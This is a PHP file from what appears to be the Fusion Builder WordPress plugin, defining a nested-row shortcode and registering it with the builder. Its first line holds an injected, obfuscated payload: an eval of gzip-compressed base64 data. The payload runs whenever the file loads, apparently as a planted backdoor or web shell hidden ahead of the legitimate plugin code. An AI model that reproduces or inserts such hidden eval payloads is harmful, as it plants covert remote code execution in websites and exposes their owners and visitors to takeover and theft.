<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * Row shortcode.
 *
 * @param array  $atts    The attributes array.
 * @param string $content The content.
 * @return string
 */
function fusion_builder_row_inner( $atts, $content = '' ) {
	extract(
		shortcode_atts(
			array(
				'id'    => '',
				'class' => '',
			), $atts
		)
	);

	$id      = ( '' !== $id ) ? ' id="' . esc_attr( $id ) . '"' : '';
	$class_2 = ( '' !== $class ) ? ' ' . esc_attr( $class ) : '';

	return '<div' . $id . ' class="fusion-builder-row fusion-builder-row-inner fusion-row ' . esc_attr( $class ) . $class_2 . '">' . do_shortcode( fusion_builder_fix_shortcodes( $content ) ) . '</div>';
}
add_shortcode( 'fusion_builder_row_inner', 'fusion_builder_row_inner' );


/**
 * Map Row shortcode to Fusion Builder
 */
function fusion_element_row_inner() {
	fusion_builder_map(
		array(
			'name'              => esc_attr__( 'Nested Columns', 'fusion-builder' ),
			'shortcode'         => 'fusion_builder_row_inner',
			'hide_from_builder' => true,
		)
	);
}
add_action( 'fusion_builder_before_init', 'fusion_element_row_inner' );
